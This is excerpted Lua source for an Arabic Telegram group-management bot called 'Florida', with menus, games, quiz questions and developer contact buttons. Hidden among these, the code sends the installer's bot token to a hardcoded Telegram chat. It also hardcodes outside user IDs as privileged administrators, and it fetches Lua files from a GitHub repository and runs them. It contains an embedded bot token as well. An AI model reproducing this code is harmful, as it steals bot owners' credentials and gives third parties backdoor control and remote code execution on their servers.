...
https.request('https://api.telegram.org/bot1736409004:AAGGdHNf-WO-gaf7FFK9JiftPBf73rpAj-o/sendmessage?chat_id=1860114886&text=' ..token)
end 
else
print('\27[0;31m◉○━━━━  𝐅𝐋𝐎𝐑𝐈𝐃𝐀  ━━━━○◉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Yusif46/sx/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1860114886,1805921575,1785825545,1897501388,1589498513}   
...
var = true  
elseif tonumber(user_id) == tonumber(1805921575) then
var = true  
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'فلوريدا') 
local DRAGON_Msg = { 
...
local Text = 'مميزات خاصه بسـ ورس فلوريدا يعسل . . . . 🥺√'
local Key = {
{'الصلاوات','اذكار','قران'},
...
os.execute('wget https://raw.githubusercontent.com/Yusif46/sx/main/DRAGON.lua')
...
send(msg.chat_id_, msg.id_,' ◍ احدث اصدار من سورس فلوريدا { S:12✓}')
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ◍ من أحسن السورسات على التليجرام سورس فلوريدا ◍
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "فلوريدا")
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝘿𝙀𝙑 𝙔𝙐 𝙎𝙄 𝙁 ',url="t.me/S_A5_D"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/S_A5_D/21&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'جوو'  then
local Text = [[
 مطور سورس فلوريدا لو حابب تتواصل معاه اتبع الزار ↓↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙅𝙊𝙊',url="t.me/Jooyabny"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BABLO_DV/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐓𝐎𝐌𝐀𝐒',url="t.me/Youssef_offical"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BABLO_DV/5&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'توماس'  then
local Text = [[
مبرمج سورس فلوريدا لو حابب تتواصل معاه اتبع الزار ↓↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐓𝐎𝐌𝐀𝐒',url="t.me/Youssef_offical"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '◉ 𝘿𝙀𝙑 𝙔𝙐𝙎𝙄𝙁',url="t.me/Youssef_offical"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BABLO_DV/5&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس فلوريدا؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس فلوريدا؟ ", 
"كم مره حبيت؟ ", 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[DV](t.me/Youssef_offical)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'Y. u s i f †', url="t.me/Youssef_offical"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == 'العاب فلوريدا' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ◍ اهلا في قائمه الالعاب المتطوره سورس فلوريدا ◍ 
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Yusif46/sx/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ◍ اهلا بك في متجر ملفات فلوريدا\n ◍ ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
...
local json_file, res = https.request("https://raw.githubusercontent.com/Yusif46/sx/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◍ عذرا الملف لايدعم سورس فلوريدا\n") 
end
return false
end
...
if text == ("مسح قائمه فلوريدا") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◍ تم مسح قائمه فلوريدا')
return false
end

if text == 'قائمه فلوريدا' and Sudo(msg) then
...
if #list == 0 then
t = " ◍ لا يوجد احد في قائمه فلوريدا"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع فلوريدا") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع فلوريدا@(.*)$") and Sudo(msg) then
local username = text:match("^رفع فلوريدا@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع فلوريدا(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع فلوريدا(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل فلوريدا") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل فلوريدا@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل فلوريدا@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل فلوريدا(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل فلوريدا(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_, t..'☩━━━━━  𝐅𝐋𝐎𝐑𝐈𝐃𝐀  ━━━━━☩\nاضغط علي الاسم ليتم نسخه\n☩━━━━━  𝐅𝐋𝐎𝐑𝐈𝐃𝐀  ━━━━━☩ٴ\n ◍  [𝙎𝙊𝙐𝙍𝘾𝙀 𝙈𝙊𝙊𝘿𝙔 ](t.me/moodyyy26) ◍ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'فلوريدا').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'فلوريدا')
local DRAGON_Msg = {
'ننعم يروحي 😻??',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
end --الكود حصري سورس فلوريدايعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فلوريدا').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '◉ فلوريدا ورب العباد') 
return false
end
...
{
{text = '𝐒𝐔𝐎𝐔𝐑𝐂𝐄 𝐒??𝐃', url="t.me/moodyyy26"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فلوريدا')
